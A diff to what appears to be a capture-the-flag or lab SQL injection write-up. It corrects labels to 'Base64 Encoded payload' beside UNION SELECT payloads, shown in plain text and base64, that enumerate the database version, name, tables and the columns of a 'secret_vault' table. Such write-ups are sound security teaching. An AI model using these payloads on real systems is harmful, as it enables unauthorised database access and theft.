@@ -109,7 +109,7 @@ Plain-text payload:
 1' UNION SELECT version()#
 ```
 
-Base64 Decoded payload:
+Base64 Encoded payload:
 
 ```
 MScgVU5JT04gU0VMRUNUIHZlcnNpb24oKSM=
@@ -141,7 +141,7 @@ Plain-text payload:
 1' UNION SELECT database()#   
 ```
 
-Base64 Decoded payload:
+Base64 Encoded payload:
 
 ```
 MScgVU5JT04gU0VMRUNUIGRhdGFiYXNlKCkjICAg
@@ -172,7 +172,7 @@ Plain-text payload:
 FROM information_schema.tables
 WHERE table_schema='critter_gallery'#   
 ```
-Base64 Decoded payload:
+Base64 Encoded payload:
 
 ```
 MScgVU5JT04gU0VMRUNUIGdyb3VwX2NvbmNhdCh0YWJsZV9uYW1lKQpGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMKV0hFUkUgdGFibGVfc2NoZW1hPSdjcml0dGVyX2dhbGxlcnknIyAgIA==
@@ -205,7 +205,7 @@ Plain-text payload:
 FROM information_schema.columns
 WHERE table_name='secret_vault'#   
 ```
-Base64 Decoded payload:
+Base64 Encoded payload:
 
 ```
 MScgVU5JT04gU0VMRUNUIGdyb3VwX2NvbmNhdChjb2x1bW5fbmFtZSkKRlJPTSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucwpXSEVSRSB0YWJsZV9uYW1lPSdzZWNyZXRfdmF1bHQnIyAgIA==
